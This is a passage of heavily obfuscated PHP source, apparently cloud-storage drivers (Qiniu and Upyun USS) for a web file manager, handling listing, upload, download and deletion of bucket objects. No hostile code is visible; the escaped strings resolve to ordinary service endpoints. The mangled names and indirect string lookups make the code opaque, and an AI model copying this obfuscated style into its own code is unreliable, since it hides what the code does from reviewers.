$‡¾ûÉÊÄ[33] => $‡¾ûÉÊÄ[242], $‡¾ûÉÊÄ[79] => isset($ÌòøåªÏ[$‡¾ûÉÊÄ[1534]]) ? $ÌòøåªÏ[$‡¾ûÉÊÄ[1534]] : 0, $‡¾ûÉÊÄ[169] => $this->ext($Ìõœ±˜Ğ)); if ($¼æ¿‰¾§) { return $·Ó©×Ò; } $·Ó©×Ò[$‡¾ûÉÊÄ[243]] = $·Ó©×Ò[$‡¾ûÉÊÄ[88]] = 0; $·Ó©×Ò[$‡¾ûÉÊÄ[244]] = $·Ó©×Ò[$‡¾ûÉÊÄ[245]] = !0; if (empty($ÌòøåªÏ)) { $ÌòøåªÏ = $this->objectMeta($Ìõœ±˜Ğ); if (!$ÌòøåªÏ) { return $·Ó©×Ò; } } if (isset($ÌòøåªÏ[$‡¾ûÉÊÄ[246]]) && $ÌòøåªÏ[$‡¾ûÉÊÄ[246]]) { $·Ó©×Ò[$‡¾ûÉÊÄ[247]] = $ÌòøåªÏ[$‡¾ûÉÊÄ[246]]; } if (isset($ÌòøåªÏ[$‡¾ûÉÊÄ[257]]) && $ÌòøåªÏ[$‡¾ûÉÊÄ[257]]) { $·Ó©×Ò[$‡¾ûÉÊÄ[247]] = $ÌòøåªÏ[$‡¾ûÉÊÄ[257]]; } if (isset($ÌòøåªÏ[$‡¾ûÉÊÄ[1535]])) { $·Ó©×Ò[$‡¾ûÉÊÄ[88]] = substr($ÌòøåªÏ[$‡¾ûÉÊÄ[1535]] . $‡¾ûÉÊÄ[12], 0, 10); } if (isset($ÌòøåªÏ[$‡¾ûÉÊÄ[1534]])) { $·Ó©×Ò[$‡¾ûÉÊÄ[79]] = $ÌòøåªÏ[$‡¾ûÉÊÄ[1534]]; } return $·Ó©×Ò; } public function folderInfo($—½¡µ, $—¡½Ñ“» = false) { $Á‰“¥Ò =& $_SERVER[±³—úê]; $¿òÕÜï“ = array($Á‰“¥Ò[32] => $this->pathThis($—½¡µ), $Á‰“¥Ò[87] => $this->getPathOuter($Á‰“¥Ò[8] . $—½¡µ), $Á‰“¥Ò[33] => $Á‰“¥Ò[78]); if ($—¡½Ñ“») { return $¿òÕÜï“; } $¿òÕÜï“[$Á‰“¥Ò[243]] = $¿òÕÜï“[$Á‰“¥Ò[88]] = 0; $¿òÕÜï“[$Á‰“¥Ò[244]] = $¿òÕÜï“[$Á‰“¥Ò[245]] = !0; $—½¡µ = rtrim($—½¡µ, $Á‰“¥Ò[8]) . $Á‰“¥Ò[8]; $Š€ûùêÌ = $this->objectMeta($—½¡µ); if (isset($Š€ûùêÌ[$Á‰“¥Ò[1535]])) { $¿òÕÜï“[$Á‰“¥Ò[88]] = substr($Š€ûùêÌ[$Á‰“¥Ò[1535]] . $Á‰“¥Ò[12], 0, 10); } return $¿òÕÜï“; } public function listPath($ûÑä²¸», $Á±Ğİ‰¤ = false) { $Ä“â¦¸À =& $_SERVER[±³—úê]; $å¡‹Š­¶ = $this->fileList($ûÑä²¸», $Ä“â¦¸À[8], !0); foreach ($å¡‹Š­¶[$Ä“â¦¸À[85]] as $÷ç»’› => $ËğâÇç) { $å¡‹Š­¶[$Ä“â¦¸À[85]][$÷ç»’›] = $this->folderInfo($ËğâÇç, $Á±Ğİ‰¤); } foreach ($å¡‹Š­¶[$Ä“â¦¸À[86]] as $÷ç»’› => $ËğâÇç) { $å¡‹Š­¶[$Ä“â¦¸À[86]][$÷ç»’›] = $this->fileInfo($ËğâÇç[$Ä“â¦¸À[97]], $Á±Ğİ‰¤, $ËğâÇç); } return $å¡‹Š­¶; } public function has($é®†Ê€, $Ú–Í´¤î = false, $„ºËÕóâ = true) { $ñ½„ ´Ø =& $_SERVER[±³—úê]; $é®†Ê€ = trim($é®†Ê€, $ñ½„ ´Ø[8]); $²ëë‡„ñ = empty($é®†Ê€) && $é®†Ê€ !== $ñ½„ ´Ø[240] ? $ñ½„ ´Ø[12] : $é®†Ê€ . $ñ½„ ´Ø[8]; $Á†Ÿš´÷ = $ñ½„ ´Ø[12]; $œ½‰Ò½Ì = 500; $½ó˜à¡ı = $ñ½„ ´Ø[8]; $¬«§±ÙÇ = $¥¥³ä¯¥ = 0; while (!0) { check_abort(); list($ßö‚Ù, $Êùäúôğ) = $this->bucketManager->listFiles($this->bucket, $²ëë‡„ñ, $Á†Ÿš´÷, $œ½‰Ò½Ì, $½ó˜à¡ı); if ($Êùäúôğ) { break; } $Á†Ÿš´÷ = array_key_exists($ñ½„ ´Ø[1480], $ßö‚Ù) ? $Á†Ÿš´÷ = $ßö‚Ù[$ñ½„ ´Ø[1536]] : $ñ½„ ´Ø[12]; if ($Ú–Í´¤î) { if (!empty($ßö‚Ù[$ñ½„ ´Ø[1537]])) { $¬«§±ÙÇ += count($ßö‚Ù[$ñ½„ ´Ø[1537]]); } if (!empty($ßö‚Ù[$ñ½„ ´Ø[1538]])) { $¥¥³ä¯¥ += count($ßö‚Ù[$ñ½„ ´Ø[1538]]); } if ($Á†Ÿš´÷ === $ñ½„ ´Ø[12]) { break; } continue; } if ($„ºËÕóâ) { if (!empty($ßö‚Ù[$ñ½„ ´Ø[1537]])) { return !0; } } else { if (!empty($ßö‚Ù[$ñ½„ ´Ø[1538]])) { return !0; } } if ($Á†Ÿš´÷ === $ñ½„ ´Ø[12]) { break; } } if ($Ú–Í´¤î) { return array($ñ½„ ´Ø[251] => $¬«§±ÙÇ, $ñ½„ ´Ø[252] => $¥¥³ä¯¥); } return !1; } public function listAll($üßˆè¤Ç) { $ßªéâ“ş =& $_SERVER[±³—úê]; $Şè®ÒûÒ = $this->fileList($üßˆè¤Ç, $ßªéâ“ş[12], !0); $ÖÓ”áÕ‡ = array_to_keyvalue($Şè®ÒûÒ[$ßªéâ“ş[86]], $ßªéâ“ş[32]); foreach ($Şè®ÒûÒ[$ßªéâ“ş[85]] as $ô§µÆíÅ) { if (is_string($ô§µÆíÅ)) { $ÖÓ”áÕ‡[$ô§µÆíÅ] = array($ßªéâ“ş[79] => 0); } } return $this->listAllFiles($üßˆè¤Ç, $ÖÓ”áÕ‡); } private function fileList($ä³Êö, $¹±ïÌ¨ = '', $Š›¡—£È = 0) { $œŒ¤ØõÜ =& $_SERVER[±³—úê]; $ä³Êö = trim($ä³Êö, $œŒ¤ØõÜ[8]); $÷±…ıÑ’ = empty($ä³Êö) && $ä³Êö !== $œŒ¤ØõÜ[240] ? $œŒ¤ØõÜ[12] : $ä³Êö . $œŒ¤ØõÜ[8]; $øÁ±­–¬ = $œŒ¤ØõÜ[12]; $í÷ª„İ = 1000; $·“ÉĞÛñ = $áåÔÖá = array(); while (!0) { check_abort(); list($Ÿ¼ƒ×Şò, $¤ëĞ¼ãÈ) = $this->bucketManager->listFiles($this->bucket, $÷±…ıÑ’, $øÁ±­–¬, $í÷ª„İ, $¹±ïÌ¨); if ($¤ëĞ¼ãÈ) { break; } $øÁ±­–¬ = array_key_exists($œŒ¤ØõÜ[1480], $Ÿ¼ƒ×Şò) ? $øÁ±­–¬ = $Ÿ¼ƒ×Şò[$œŒ¤ØõÜ[1536]] : $œŒ¤ØõÜ[12]; $ï‹Ş’½ó = isset($Ÿ¼ƒ×Şò[$œŒ¤ØõÜ[1537]]) ? $Ÿ¼ƒ×Şò[$œŒ¤ØõÜ[1537]] : array(); $˜ìÎ”¢… = isset($Ÿ¼ƒ×Şò[$œŒ¤ØõÜ[1538]]) ? $Ÿ¼ƒ×Şò[$œŒ¤ØõÜ[1538]] : array(); foreach ($ï‹Ş’½ó as $¤Ğèğ¬ã) { if ($¤Ğèğ¬ã[$œŒ¤ØõÜ[97]] == $÷±…ıÑ’) { continue; } $ïú¶±÷” = $¤Ğèğ¬ã[$œŒ¤ØõÜ[97]]; $¨Ë²ã­ = $¤Ğèğ¬ã[$œŒ¤ØõÜ[1534]]; $¤Ğèğ¬ã[$œŒ¤ØõÜ[79]] = $¨Ë²ã­; $ªËôçç’ = $¨Ë²ã­ == 0 && substr($ïú¶±÷”, strlen($ïú¶±÷”) - 1, 1) == $œŒ¤ØõÜ[8] ? !0 : !1; $this->cacheMethodInfoSet($ïú¶±÷”, $ªËôçç’, $¤Ğèğ¬ã); if ($ªËôçç’) { $·“ÉĞÛñ[] = $ïú¶±÷”; continue; } $áåÔÖá[] = $Š›¡—£È ? $¤Ğèğ¬ã : $ïú¶±÷”; } foreach ($˜ìÎ”¢… as $ïú¶±÷”) { if ($ïú¶±÷” == $÷±…ıÑ’) { continue; } $·“ÉĞÛñ[] = $ïú¶±÷”; $this->cacheMethodInfoSet($ïú¶±÷”, !0); } if ($øÁ±­–¬ === $œŒ¤ØõÜ[12]) { break; } } $this->cacheMethodInfoSet($ä³Êö, !0); return array($œŒ¤ØõÜ[85] => $·“ÉĞÛñ, $œŒ¤ØõÜ[86] => $áåÔÖá); } public function canRead($Ç¥²¹×ˆ) { return $this->exist($Ç¥²¹×ˆ) ? !0 : !1; } public function canWrite($Ğ³ç‚èŒ) { return $this->exist($Ğ³ç‚èŒ) ? !0 : !1; } public function getContent($ÙŸÉ½É) { return $this->fileSubstr($ÙŸÉ½É, 0, -1); } public function setContent($³«Ò±®÷, $Ã‡÷¡ü = '') { $ƒ¬›ÍîŞ = $this->tempFile($this->pathThis($³«Ò±®÷)); file_put_contents($ƒ¬›ÍîŞ, $Ã‡÷¡ü); if ($this->upload($³«Ò±®÷, $ƒ¬›ÍîŞ)) { $this->tempFileRemve($ƒ¬›ÍîŞ); return !0; } return !1; } public function refreshUrls($š§úóß) { $œšôøƒ =& $_SERVER[±³—úê]; $¢‹ö˜×  = array(); if (is_array($š§úóß)) { foreach ($š§úóß as $é¤äéóè) { $¢‹ö˜× [] = $this->link($é¤äéóè); } } else { $¢‹ö˜× [] = $this->link($š§úóß); } $½ÎìÊ›’ = new Qiniu\Cdn\CdnManager($this->auth); list($åàşÌÛ, $â ãô’¤) = $½ÎìÊ›’->refreshUrls($¢‹ö˜× ); if ($â ãô’¤) { return !1; } return $åàşÌÛ[$œšôøƒ[1266]] == $œšôøƒ[839] ? !0 : !1; } public function fileSubstr($”×ÖÃ–İ, $ê·Ş´÷š, $¸· êš£) { $ãöÛÃ±Ø =& $_SERVER[±³—úê]; if (!($¥÷¾ù˜¤ = $this->link($”×ÖÃ–İ))) { return !1; } $úËÒà¤Ÿ = !1; if ($¸· êš£ > 0) { $Ï³àğñ = $ê·Ş´÷š + $¸· êš£ - 1; $úËÒà¤Ÿ = array($ãöÛÃ±Ø[1539] . $ê·Ş´÷š . $ãöÛÃ±Ø[473] . $Ï³àğñ); } $ˆŠ‰³ôË = url_request($¥÷¾ù˜¤, $ãöÛÃ±Ø[1499], !1, $úËÒà¤Ÿ); return $ˆŠ‰³ôË[$ãöÛÃ±Ø[830]] ? $ˆŠ‰³ôË[$ãöÛÃ±Ø[1289]] : !1; } public function upload($¼çëˆ«ü, $°—²Ëâ¦, $¾ƒÚİ = false, $Õå³ãÙÓ = REPEAT_REPLACE) { $•¦½×«° = new Qiniu\Storage\UploadManager(); $†¬Ü›ŒÇ = $this->auth->uploadToken($this->bucket, $¼çëˆ«ü); $—¯É£± = get_file_mime(get_path_ext($°—²Ëâ¦)); list($ÎŞØ‹¯˜, $Ş ê’­) = $•¦½×«°->putFile($†¬Ü›ŒÇ, $¼çëˆ«ü, $°—²Ëâ¦, null, $—¯É£±); return $Ş ê’­ ? !1 : $this->getPathOuter($¼çëˆ«ü); } public function uploadFormData($´üß”ï•, $ÌË°À¯œ = 3600) { return $this->uploadToken($´üß”ï•, $ÌË°À¯œ); } public function uploadMultiData($Ì˜ßû¨í, $ã•ª…À­ = 3600) { return $this->uploadToken($Ì˜ßû¨í, $ã•ª…À­); } private function uploadToken($êœ¢ÍµÊ, $ìÔ¸²ç = 3600) { $İÍøüñË =& $_SERVER[±³—úê]; $ôÛŸşÖÆ = $ìÔ¸²ç; $“Øíæø = array($İÍøüñË[1540] => $İÍøüñË[1541]); $‡¿İÅ¨ç = $êœ¢ÍµÊ; $ôß¾•ª¢ = $this->auth->uploadToken($this->bucket, $‡¿İÅ¨ç, $ôÛŸşÖÆ, $“Øíæø, !0); $úÉÓ•‰ = empty($this->region) || $this->region == $İÍøüñË[1542] ? $İÍøüñË[12] : $İÍøüñË[473] . $this->region; $ïØ§¾‘ = http_type() . "\x3a\57\x2f\x75\160\x6c\157\141\144{$úÉÓ•‰}\56\x71\x69\156\151\165\160\56\143\x6f\x6d\57"; return array($İÍøüñË[1543] => $ôß¾•ª¢, $İÍøüñË[1544] => $ïØ§¾‘); } public function download($ÚìÁêÏ¡, $ÁëÈÖäş) { $ø†¨Õœ = IO::getPathInner(IO::mkfile($ÁëÈÖäş)); if (!($ôûå¶“ = $this->link($ÚìÁêÏ¡))) { return !1; } $Éú×çÍ• = 0; $£©Ÿ‡¥¢ = 1024 * 200; $Š‰Œ¯Åê = fopen($ø†¨Õœ, $_SERVER[±³—úê][1545]); while (!0) { $®¥»êê = $this->fileSubstr($ÚìÁêÏ¡, $Éú×çÍ•, $£©Ÿ‡¥¢); if ($®¥»êê === !1) { return !1; } fwrite($Š‰Œ¯Åê, $®¥»êê); $Éú×çÍ• += $£©Ÿ‡¥¢; if (strlen($®¥»êê) < $£©Ÿ‡¥¢) { break; } } fclose($Š‰Œ¯Åê); return $ÁëÈÖäş; } public function link($’ô²şï, $°şÔ¥á¡ = '') { if (!$this->isFile($’ô²şï)) { return !1; } $«‘çí  = $this->getHost() . $_SERVER[±³—úê][8] . $this->pathEncode($’ô²şï) . $°şÔ¥á¡; return $this->auth->privateDownloadUrl($«‘çí , 3600 * 12); } public function fileOut($§Ù•¶İ, $ÍŒæÀ¸ = false, $³¤ß¹«’ = false, $Û¼Îğ‘ = '') { $ÛÌÛ¢ÊØ =& $_SERVER[±³—úê]; if ($this->isFileOutServer()) { return $this->fileOutServer($§Ù•¶İ, $ÍŒæÀ¸, $³¤ß¹«’, $Û¼Îğ‘); } if (!$³¤ß¹«’) { $³¤ß¹«’ = $this->pathThis($§Ù•¶İ); } $¢Õ¼×±Ú = $ÍŒæÀ¸ ? $ÛÌÛ¢ÊØ[1546] . rawurlencode($³¤ß¹«’) : $ÛÌÛ¢ÊØ[12]; $ºóÁÒïã = $this->link($§Ù•¶İ, $¢Õ¼×±Ú); $this->fileOutLink($ºóÁÒïã); } public function fileOutServer($·ª›¾æ, $áÁ¥ô»Ó = false, $®·­âàâ = false, $¹ó…ßé = '') { parent::fileOut($·ª›¾æ, $áÁ¥ô»Ó, $®·­âàâ, $¹ó…ßé); } public function fileOutImage($Ä©Üúñá, $Í€¬üê = 250) { if ($this->size($Ä©Üúñá) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ä©Üúñá, $Í€¬üê); } $šŸ„ÔÉÚ = $this->link($Ä©Üúñá, $_SERVER[±³—úê][1547] . $Í€¬üê); $this->fileOutLink($šŸ„ÔÉÚ); } public function fileOutImageServer($ş„ªÊ²ï, $–íÂ„äÈ = 250) { parent::fileOutImage($ş„ªÊ²ï, $–íÂ„äÈ); } public function hashMd5($º¨Ã¥€½) { $í³çÁîš =& $_SERVER[±³—úê]; $‰²³ò‡¡ = $this->objectMeta($º¨Ã¥€½); return isset($‰²³ò‡¡[$í³çÁîš[257]]) ? $‰²³ò‡¡[$í³çÁîš[257]] : !1; $™‹­Œ‡Ó = $this->link($º¨Ã¥€½, $í³çÁîš[1548]); } public function size($÷Õêòì) { $È‘ıÉ˜¯ = $this->objectMeta($÷Õêòì); return $È‘ıÉ˜¯ ? $È‘ıÉ˜¯[$_SERVER[±³—úê][79]] : 0; } public function info($êşïÍ¢À) { if ($this->isFolder($êşïÍ¢À)) { return $this->folderInfo($êşïÍ¢À); } else { if ($this->isFile($êşïÍ¢À)) { return $this->fileInfo($êşïÍ¢À); } } return !1; } public function exist($óŒ¬Š´ô) { return $this->isFile($óŒ¬Š´ô) || $this->isFolder($óŒ¬Š´ô); } public function isFile($ÄëÜ£µ) { return !$this->isFolder($ÄëÜ£µ) && $this->objectMeta($ÄëÜ£µ); } public function isFolder($ÖœÁ¢í¨) { return $this->cacheMethod($_SERVER[±³—úê][179], $ÖœÁ¢í¨); } protected function objectMeta($â®Ñ¯—œ) { return $this->cacheMethod($_SERVER[±³—úê][181], $â®Ñ¯—œ); } protected function _objectMeta($Œ™ÍúÓÊ) { $—£ ëò“ =& $_SERVER[±³—úê]; list($ŸŞï’¯ğ, $ãã›¥É) = $this->bucketManager->stat($this->bucket, $Œ™ÍúÓÊ); if ($ŸŞï’¯ğ) { $ŸŞï’¯ğ[$—£ ëò“[79]] = intval($ŸŞï’¯ğ[$—£ ëò“[1534]]); } return $ŸŞï’¯ğ; } protected function _isFolder($•¯Ãˆ˜¬) { $ÑÚÀÚö =& $_SERVER[±³—úê]; if ($•¯Ãˆ˜¬ == $ÑÚÀÚö[12] || $•¯Ãˆ˜¬ == $ÑÚÀÚö[8]) { return !0; } list($ƒ¼¨Û¬ğ, $ŞöÄÁ£˜) = $this->bucketManager->listFiles($this->bucket, trim($•¯Ãˆ˜¬, $ÑÚÀÚö[8]) . $ÑÚÀÚö[8], $ÑÚÀÚö[12], 1, $ÑÚÀÚö[8]); return !empty($ƒ¼¨Û¬ğ[$ÑÚÀÚö[1537]]) || !empty($ƒ¼¨Û¬ğ[$ÑÚÀÚö[1538]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Ô×™…µî, $ëÚü¨Œ = 0) { parent::__construct(); $this->source = $Ô×™…µî; $this->sourceSize = $ëÚü¨Œ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($£Ë°­µ = false) { return $this->sourceSize; } public function getContent($÷˜§àÒ = false) { return $this->fileSubstr($÷˜§àÒ, 0, $this->sourceSize); } public function fileSubstr($É´ÃôËì = false, $Î±ôë×ƒ = 0, $°°åòÙŒ = 0) { if (!$°°åòÙŒ) { $°°åòÙŒ = $this->sourceSize; } $™“úø = $this->sourceSize - $Î±ôë×ƒ; if ($°°åòÙŒ >= $™“úø) { $°°åòÙŒ = $™“úø; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Î±ôë×ƒ, $°°åòÙŒ); } if ($this->sourceType == self::TYPE_FILE) { if ($°°åòÙŒ <= 0) { return $_SERVER[±³—úê][12]; } $É™ãÛ„Í = ftell($this->source); fseek_64($this->source, $É™ãÛ„Í + $Î±ôë×ƒ); $ªãé¨Å† = @fread($this->source, $°°åòÙŒ); fseek_64($this->source, $É™ãÛ„Í); return $ªãé¨Å†; } } public function hashMd5($œõ‘€Ï² = false) { return md5($this->getContent()); } public static function hash($¨¿—©², $À”µ»¯¶ = 0) { $Á§¿«ïî = new PathDriverStream($¨¿—©², $À”µ»¯¶); return $Á§¿«ïî->hashSimple($¨¿—©²); } public static function md5($¯Åí£Ã¥, $ğØÜ‘ÆÓ = 0) { $ôãÑåñ¥ = new PathDriverStream($¯Åí£Ã¥, $ğØÜ‘ÆÓ); return $ôãÑåñ¥->hashMd5($¯Åí£Ã¥); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\72\x2f\x2f\x76\x30\x2e\141\x70\x69\56\165\160\171\165\x6e\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Œ‘ª…ƒÜ) { parent::__construct(); $this->_init($Œ‘ª…ƒÜ); } public function _init($ì©ÓÅÄ‰) { $éûç†Ÿñ =& $_SERVER[±³—úê]; foreach ($ì©ÓÅÄ‰ as $Ê´Æ¯ÙŸ => $ì¹êÅãÇ) { if (isset($this->{$Ê´Æ¯ÙŸ})) { $this->{$Ê´Æ¯ÙŸ} = $ì¹êÅãÇ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($éûç†Ÿñ[1549] . LNG($éûç†Ÿñ[1468])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ø—–, $Ğ¶ËÛå´ = "\x47\105\124") { $½´Õğ›ú =& $_SERVER[±³—úê]; $Óíšæõâ = gmdate($½´Õğ›ú[1497]); $ñ¯ƒú–µ = base64_encode(hash_hmac($½´Õğ›ú[1550], "{$Ğ¶ËÛå´}\x26{$ø—–}\x26{$Óíšæõâ}", md5("{$this->userpass}"), !0)); $›İ±«ïá = array("\101\x75\x74\x68\157\162\151\x7a\x61\164\151\x6f\x6e\72\125\120\x59\x55\116\x20{$this->username}\72{$ñ¯ƒú–µ}", "\x44\141\x74\145\x3a{$Óíšæõâ}"); return $›İ±«ïá; } public function ussRequest($ô›†´¹ğ, $½©÷éòö = "\x47\x45\x54", $“éÇÀİÏ = false, $ğ†Åºù = false, $ñ¾úó‹º = false) { $ˆÖ‰ÅÄë =& $_SERVER[±³—úê]; $ô›†´¹ğ = trim($ô›†´¹ğ, $ˆÖ‰ÅÄë[8]); $ÉÍÉÉú = "\x2f{$this->bucket}\57" . rawurlencode($ô›†´¹ğ); $ùÕÚ¿¦Ç = $this->ussHeaders($ÉÍÉÉú, $½©÷éòö); if ($ğ†Åºù) { $ùÕÚ¿¦Ç = array_merge($ùÕÚ¿¦Ç, $ğ†Åºù); } $ÈÔÙ›ä¹ = url_request($this->endpoint . $ÉÍÉÉú, $½©÷éòö, $“éÇÀİÏ, $ùÕÚ¿¦Ç, $ñ¾úó‹º); if (!$ÈÔÙ›ä¹) { $ÙÙïÜ°¡ = LNG($ˆÖ‰ÅÄë[1551]); $this->writeLog($ÙÙïÜ°¡); return array($ˆÖ‰ÅÄë[1299] => !1, $ˆÖ‰ÅÄë[1289] => $ÙÙïÜ°¡); } if (strtolower($½©÷éòö) == $ˆÖ‰ÅÄë[239] || in_array($ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[1299]], array($ˆÖ‰ÅÄë[273], $ˆÖ‰ÅÄë[1552]))) { $“éÇÀİÏ = $ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[1553]]; if (!$ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[830]]) { $“éÇÀİÏ = isset($“éÇÀİÏ[0]) ? $“éÇÀİÏ[0] : $ˆÖ‰ÅÄë[12]; } } else { $“éÇÀİÏ = json_decode($ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[1289]], !0); if (!$“éÇÀİÏ) { $“éÇÀİÏ = $ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[1289]]; } else { if (!$ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[830]] && isset($“éÇÀİÏ[$ˆÖ‰ÅÄë[1554]])) { $“éÇÀİÏ = $“éÇÀİÏ[$ˆÖ‰ÅÄë[1554]]; } } } if (!$ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[830]]) { $this->writeLog($this->__errorMessage($“éÇÀİÏ)); } return array($ˆÖ‰ÅÄë[1299] => $ÈÔÙ›ä¹[$ˆÖ‰ÅÄë[830]], $ˆÖ‰ÅÄë[1289] => $“éÇÀİÏ); } private function __errorMessage($¦‹æÔí²) { $÷¢ë©¬· =& $_SERVER[±³—úê]; if (!$¦‹æÔí²) { return $÷¢ë©¬·[12]; } static $ÄñÑ“¨ = null; if (!$ÄñÑ“¨) { $ÄñÑ“¨ = I18n::getType(); } if ($ÄñÑ“¨ != $÷¢ë©¬·[1507]) { return $¦‹æÔí²; } $„›¼ØÈ— = array($÷¢ë©¬·[1555] => $÷¢ë©¬·[1556], $÷¢ë©¬·[1557] => $÷¢ë©¬·[1558], $÷¢ë©¬·[1559] => $÷¢ë©¬·[1558], $÷¢ë©¬·[1560] => $÷¢ë©¬·[1561], $÷¢ë©¬·[1562] => $÷¢ë©¬·[1563], $÷¢ë©¬·[1564] => $÷¢ë©¬·[1565], $÷¢ë©¬·[1566] => $÷¢ë©¬·[1567]); return isset($„›¼ØÈ—[$¦‹æÔí²]) ? $„›¼ØÈ—[$¦‹æÔí²] : $¦‹æÔí²; } public function mkfile($¯Ö²ñÈ½, $ç¢ÖÆîè = '', $×ÇÈŠë¬ = REPEAT_RENAME) { if ($this->setContent($¯Ö²ñÈ½, $ç¢ÖÆîè)) { return $this->getPathOuter($¯Ö²ñÈ½); } return !1; } public function mkdir($·³„íÜ, $çúá Å— = REPEAT_SKIP) { $Â†Éõ =& $_SERVER[±³—úê]; $Ä°ä×Ë = trim($·³„íÜ, $Â†Éõ[8]); if ($this->_isFolder($Ä°ä×Ë)) { return $this->getPathOuter($Ä°ä×Ë); } $‚î¦ú·Ÿ = array($Â†Éõ[1568]); $×—¿ö™ı = $this->ussRequest($Ä°ä×Ë, $Â†Éõ[299], !1, $‚î¦ú·Ÿ); return $×—¿ö™ı[$Â†Éõ[1299]] ? $this->getPathOuter($Ä°ä×Ë) : !1; } public function copyFile($àÜİÂÕæ, $ßïÀß§ñ) { $Æà‚¼—Ğ =& $_SERVER[±³—úê]; $«Ùú»ÂÁ = array($Æà‚¼—Ğ[1569] . "\x2f{$this->bucket}\57{$àÜİÂÕæ}", $Æà‚¼—Ğ[1570]); $¯™çÙ§ = $this->ussRequest($ßïÀß§ñ, $Æà‚¼—Ğ[265], !1, $«Ùú»ÂÁ); return $¯™çÙ§[$Æà‚¼—Ğ[1299]] ? !0 : $this->getPathOuter($ßïÀß§ñ); } public function moveFile($ãŞ˜Ñ•·, $ƒÛè†) { $ˆÕÂ¨é =& $_SERVER[±³—úê]; $Ş®Û–Ö‡ = array($ˆÕÂ¨é[1571] . "\x2f{$this->bucket}\57{$ãŞ˜Ñ•·}", $ˆÕÂ¨é[1570]); $ÏôÑû—õ = $this->ussRequest($ƒÛè†, $ˆÕÂ¨é[265], !1, $Ş®Û–Ö‡); return $ÏôÑû—õ[$ˆÕÂ¨é[1299]] ? !0 : $this->getPathOuter($ƒÛè†); } public function delFile($¡Æ®Ù¯±) { $†ÙïëĞô =& $_SERVER[±³—úê]; $©¿÷¼‰õ = $this->ussRequest($¡Æ®Ù¯±, $†ÙïëĞô[1572]); return $©¿÷¼‰õ[$†ÙïëĞô[1299]] ? !0 : !1; } public function delFolder($Ñù½Ú) { $µ§ƒÑ•¯ =& $_SERVER[±³—úê]; if (!$this->exist($Ñù½Ú)) { return !0; } $this->listItemCache = !1; $üÏïë€â = $çÕíØŒÂ = array(); $this->fileList($Ñù½Ú, $üÏïë€â, $çÕíØŒÂ, !0); $this->listItemCache = !0; foreach ($çÕíØŒÂ as $Œ¥Ø—Ì¦) { $¼ÍŞ±« = $this->ussRequest($Œ¥Ø—Ì¦[$µ§ƒÑ•¯[32]], $µ§ƒÑ•¯[1572]); if (!$¼ÍŞ±«[$µ§ƒÑ•¯[1299]]) { return !1; } } usort($üÏïë€â, function ($İÁş—¢ˆ, $¼Ç™ñ°À) { $°Ëøò¿ş =& $_SERVER[±³—úê]; return substr_count($¼Ç™ñ°À, $°Ëøò¿ş[8]) - substr_count($İÁş—¢ˆ, $°Ëøò¿ş[8]); }); foreach ($üÏïë€â as $×¯áÏ¤ª) { $¼ÍŞ±« = $this->ussRequest($×¯áÏ¤ª, $µ§ƒÑ•¯[1572]); if (!$¼ÍŞ±«[$µ§ƒÑ•¯[1299]]) { return !1; } } $¼ÍŞ±« = $this->ussRequest($Ñù½Ú, $µ§ƒÑ•¯[1572]); return $¼ÍŞ±«[$µ§ƒÑ•¯[1299]]; } public function rename($¥Ô¬ÑâÈ, $Âµ¹Çºğ) { if ($this->isFile($¥Ô¬ÑâÈ)) { $Âµ¹Çºğ = get_path_father($¥Ô¬ÑâÈ) . $Âµ¹Çºğ; return $this->moveFile($¥Ô¬ÑâÈ, $Âµ¹Çºğ); } return $this->renameObject($¥Ô¬ÑâÈ, $Âµ¹Çºğ); } public function fileInfo($œƒö·Èá, $ÂÆ¡½€ = false, $ÀìèÛğ = array()) { $Ãûò°İ =& $_SERVER[±³—úê]; $¿ÄÑ©é = array($Ãûò°İ[32] => $this->pathThis($œƒö·Èá), $Ãûò°İ[87] => $this->getPathOuter($Ãûò°İ[8] . $œƒö·Èá), $Ãûò°İ[33] => $Ãûò°İ[242], $Ãûò°İ[79] => isset($ÀìèÛğ[$Ãûò°İ[79]]) ? $ÀìèÛğ[$Ãûò°İ[79]] : 0, $Ãûò°İ[169] => $this->ext($œƒö·Èá)); if ($ÂÆ¡½€) { return $¿ÄÑ©é; } $¿ÄÑ©é[$Ãûò°İ[243]] = $¿ÄÑ©é[$Ãûò°İ[88]] = 0; $¿ÄÑ©é[$Ãûò°İ[244]] = $¿ÄÑ©é[$Ãûò°İ[245]] = !0; if (empty($ÀìèÛğ)) { $ÀìèÛğ = $this->objectMeta($œƒö·Èá); if (!$ÀìèÛğ) { return $¿ÄÑ©é; } } $¿ÄÑ©é[$Ãûò°İ[243]] = intval($ÀìèÛğ[$Ãûò°İ[1573]]); $¿ÄÑ©é[$Ãûò°İ[88]] = intval($ÀìèÛğ[$Ãûò°İ[1574]]); $¿ÄÑ©é[$Ãûò°İ[79]] = $ÀìèÛğ[$Ãûò°İ[79]]; return $¿ÄÑ©é; } public function folderInfo($šşªù¸õ, $ˆÕÆó§ = false) { $Š«Ÿé =& $_SERVER[±³—úê]; $«å–öñş = array($Š«Ÿé[32] => $this->pathThis($šşªù¸õ), $Š«Ÿé[87] => $this->getPathOuter($Š«Ÿé[8] . $šşªù¸õ), $Š«Ÿé[33] => $Š«Ÿé[78]); if ($ˆÕÆó§) { return $«å–öñş; } $«å–öñş[$Š«Ÿé[243]] = $«å–öñş[$Š«Ÿé[88]] = 0; $«å–öñş[$Š«Ÿé[244]] = $«å–öñş[$Š«Ÿé[245]] = 